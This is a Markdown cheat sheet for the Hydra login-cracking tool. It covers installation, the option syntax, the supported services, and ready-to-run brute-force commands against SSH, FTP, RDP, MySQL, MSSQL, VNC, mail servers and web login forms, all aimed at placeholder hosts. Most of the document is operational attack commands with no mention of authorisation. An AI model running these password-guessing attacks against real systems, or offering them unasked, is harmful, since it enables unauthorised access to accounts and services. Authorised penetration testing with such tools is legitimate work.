# Hydra

Hydra is a fast network login cracker that supports numerous attack protocols. It is a versatile tool that can brute-force a wide range of services, including web applications, remote login services like SSH and FTP, and databases.

## Why Use Hydra?

- **Speed and Efficiency**: Utilizes parallel connections to perform multiple login attempts simultaneously
- **Flexibility**: Supports many protocols and services for various attack scenarios
- **Ease of Use**: Straightforward command-line interface with clear syntax

## Installation

Verify if Hydra is installed:

```bash
hydra -h
```

If not installed, use your package manager:

```bash
sudo apt-get -y update && sudo apt-get -y install hydra
```

## Basic Syntax

```bash
hydra [login_options] [password_options] [attack_options] [service_options]
```

| Option | Purpose | Example |
|--------|---------|---------|
| `-l LOGIN` / `-L FILE` | Single username or username list | `-l admin` or `-L usernames.txt` |
| `-p PASS` / `-P FILE` | Single password or password list | `-p password123` or `-P passwords.txt` |
| `-t TASKS` | Number of parallel threads | `-t 4` |
| `-f` | Stop after first success | `-f` |
| `-s PORT` | Non-default port | `-s 2222` |
| `-v` / `-V` | Verbose output | `-v` or `-V` |
| `service://server` | Target service and host | `ssh://192.168.1.100` |

## Supported Services

| Service | Protocol | Example |
|---------|----------|---------|
| `ftp` | File Transfer Protocol | `hydra -l admin -P pass.txt ftp://192.168.1.100` |
| `ssh` | Secure Shell | `hydra -l root -P pass.txt ssh://192.168.1.100` |
| `http-get` / `http-post` | HTTP Web Forms | `hydra -l admin -P pass.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| `smtp` | Email (SMTP) | `hydra -l admin -P pass.txt smtp://mail.server.com` |
| `pop3` | Email (POP3) | `hydra -l user@example.com -P pass.txt pop3://mail.server.com` |
| `imap` | Email (IMAP) | `hydra -l user@example.com -P pass.txt imap://mail.server.com` |
| `mysql` | MySQL Database | `hydra -l root -P pass.txt mysql://192.168.1.100` |
| `mssql` | Microsoft SQL Server | `hydra -l sa -P pass.txt mssql://192.168.1.100` |
| `vnc` | Virtual Network Computing | `hydra -P pass.txt vnc://192.168.1.100` |
| `rdp` | Remote Desktop Protocol | `hydra -l admin -P pass.txt rdp://192.168.1.100` |

## Common Examples

### HTTP Basic Authentication

```bash
hydra -L usernames.txt -P passwords.txt www.example.com http-get
```

### Multiple SSH Servers

```bash
hydra -l root -p toor -M targets.txt ssh
```

### FTP on Non-Standard Port

```bash
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```

### Web Login Form

```bash
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

### RDP with Custom Character Set

```bash
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```
